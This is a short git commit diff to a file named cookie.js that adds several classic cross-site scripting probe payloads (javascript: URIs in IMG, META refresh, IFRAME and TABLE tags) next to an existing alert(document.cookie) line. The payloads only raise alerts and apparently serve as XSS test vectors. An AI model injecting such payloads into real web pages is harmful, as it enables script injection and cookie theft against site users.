5f89fc599e10e4b7cdf0d1fee01535b6cf4e35c1
Petr Jakubec <petrjakube@gmail.com>
2018-09-25 14:35:58 +0200

    Update cookie.js

--- cookie.js
+++ cookie.js
@@ -1,1 +1,9 @@
+
+<IMG SRC=javascript:alert(img);>
+
+<META HTTP-EQUIV=refresh CONTENT=0;url=javascript:alert(meta http);>
+
+<IFRAME SRC=javascript:alert(iframe);></IFRAME>
+
+<TABLE BACKGROUND=javascript:alert(table)>
 alert(document.cookie);
